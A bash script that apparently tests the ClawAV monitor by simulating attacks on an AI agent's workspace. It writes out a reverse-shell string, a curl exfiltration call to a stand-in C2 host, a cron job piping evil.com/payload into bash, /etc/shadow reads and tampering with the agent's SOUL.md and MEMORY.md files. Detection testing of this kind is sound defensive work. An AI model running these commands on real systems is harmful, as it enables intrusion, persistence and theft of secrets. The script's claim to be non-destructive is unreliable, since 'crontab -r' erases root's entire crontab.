#!/usr/bin/env bash
# ClawAV Attack Simulation POC — SAFE, non-destructive
# Run with: sudo bash scripts/poc-attack-sim.sh
set -euo pipefail

ALERTS="/var/log/clawav/alerts.jsonl"
WORKSPACE="/home/openclaw/.openclaw/workspace"

if [[ ! -f "$ALERTS" ]]; then
    echo "ERROR: ClawAV alerts log not found at $ALERTS"
    exit 1
fi

BEFORE=$(wc -l < "$ALERTS")
echo "═══════════════════════════════════════════════════"
echo "  ClawAV Attack Simulation POC"
echo "═══════════════════════════════════════════════════"
echo "Starting alert count: $BEFORE"
echo ""

# Helper: count new alerts since BEFORE
check_alerts() {
    local now
    now=$(wc -l < "$ALERTS")
    local new=$((now - BEFORE))
    if [[ $new -gt 0 ]]; then
        echo "  → $new new alert(s) detected"
        tail -n "$new" "$ALERTS" | jq -r '"    [\(.severity)] \(.source): \(.message)"' 2>/dev/null || true
    else
        echo "  → No new alerts (MISSED)"
    fi
    BEFORE=$now
    echo ""
}

# ═══════════════════════════════════════════════════
# TEST 1: Cognitive file tampering (SOUL.md)
# Expected: CRITICAL cognitive integrity alert
# ═══════════════════════════════════════════════════
echo "[TEST 1] Cognitive file tampering — appending to SOUL.md..."
cp "$WORKSPACE/SOUL.md" /tmp/soul-backup-poc.md
echo -e "\n# INJECTED BY ATTACKER — this line should trigger ClawAV" >> "$WORKSPACE/SOUL.md"
sleep 5
# Restore immediately
cp /tmp/soul-backup-poc.md "$WORKSPACE/SOUL.md"
rm /tmp/soul-backup-poc.md
echo "  (Restored original)"
check_alerts

# ═══════════════════════════════════════════════════
# TEST 2: MEMORY.md tampering
# Expected: WARNING with diff (watched file, not protected)
# ═══════════════════════════════════════════════════
echo "[TEST 2] Memory file tampering — appending to MEMORY.md..."
cp "$WORKSPACE/MEMORY.md" /tmp/memory-backup-poc.md
echo -e "\n## INJECTED FAKE MEMORY — attacker planted false context" >> "$WORKSPACE/MEMORY.md"
sleep 5
cp /tmp/memory-backup-poc.md "$WORKSPACE/MEMORY.md"
rm /tmp/memory-backup-poc.md
echo "  (Restored original)"
check_alerts

# ═══════════════════════════════════════════════════
# TEST 3: Credential file access (/etc/shadow)
# Expected: auditd/behavior alert — sensitive file read
# ═══════════════════════════════════════════════════
echo "[TEST 3] Credential file access — reading /etc/shadow..."
cat /etc/shadow > /dev/null 2>&1 || true
sleep 5
check_alerts

# ═══════════════════════════════════════════════════
# TEST 4: Reverse shell pattern
# Expected: behavior DATA_EXFIL or PRIV_ESCALATION alert
# Note: Just echoes the string, doesn't execute it
# ═══════════════════════════════════════════════════
echo "[TEST 4] Reverse shell command pattern (echo only, not executed)..."
bash -c 'echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" > /dev/null' 2>/dev/null || true
sleep 5
check_alerts

# ═══════════════════════════════════════════════════
# TEST 5: Suspicious data exfiltration via curl
# Expected: policy block-data-exfiltration alert
# Note: Target doesn't exist, curl will fail — that's fine
# ═══════════════════════════════════════════════════
echo "[TEST 5] Simulated data exfiltration via curl..."
curl -s -o /dev/null --max-time 2 "http://evil-c2-server.example.com/exfil?data=stolen" 2>/dev/null || true
sleep 5
check_alerts

# ═══════════════════════════════════════════════════
# TEST 6: Crontab persistence attempt
# Expected: behavior/auditd alert — crontab modification
# Note: Creates then immediately removes
# ═══════════════════════════════════════════════════
echo "[TEST 6] Crontab persistence — adding then removing malicious cron..."
(echo "* * * * * curl http://evil.com/payload | bash") | crontab - 2>/dev/null || true
sleep 2
crontab -r 2>/dev/null || true
sleep 5
check_alerts

# ═══════════════════════════════════════════════════
# TEST 7: Reconnaissance commands
# Expected: behavior RECON alert
# ═══════════════════════════════════════════════════
echo "[TEST 7] Reconnaissance — system enumeration..."
whoami > /dev/null 2>&1
id > /dev/null 2>&1
uname -a > /dev/null 2>&1
cat /etc/passwd > /dev/null 2>&1
ps aux > /dev/null 2>&1
sleep 5
check_alerts

# ═══════════════════════════════════════════════════
# TEST 8: Environment variable exfiltration
# Expected: behavior ENV_EXFIL or DATA_EXFIL alert
# ═══════════════════════════════════════════════════
echo "[TEST 8] Env var exfiltration attempt..."
env | grep -i key > /dev/null 2>&1 || true
printenv AWS_SECRET_ACCESS_KEY > /dev/null 2>&1 || true
sleep 5
check_alerts

# ═══════════════════════════════════════════════════
# TEST 9: LD_PRELOAD injection attempt
# Expected: behavior SEC_TAMPER or auditd alert
# ═══════════════════════════════════════════════════
echo "[TEST 9] LD_PRELOAD injection pattern..."
LD_PRELOAD=/tmp/evil.so ls > /dev/null 2>&1 || true
sleep 5
check_alerts

# ═══════════════════════════════════════════════════
# TEST 10: Base64 decode pattern (common exfil technique)
# Expected: behavior alert — suspicious decode
# ═══════════════════════════════════════════════════
echo "[TEST 10] Base64 decode pattern..."
echo "c3RvbGVuIGRhdGE=" | base64 -d > /dev/null 2>&1 || true
sleep 5
check_alerts

# ═══════════════════════════════════════════════════
# RESULTS
# ═══════════════════════════════════════════════════
AFTER=$(wc -l < "$ALERTS")
TOTAL_NEW=$((AFTER - $(head -1 /tmp/poc-start-count 2>/dev/null || echo "$BEFORE")))

echo "═══════════════════════════════════════════════════"
echo "  POC COMPLETE"
echo "═══════════════════════════════════════════════════"
echo ""
echo "Review results above. Each test shows whether ClawAV"
echo "detected the simulated attack and at what severity."
echo ""
echo "All modifications have been restored to originals."
echo "No permanent changes were made to the system."
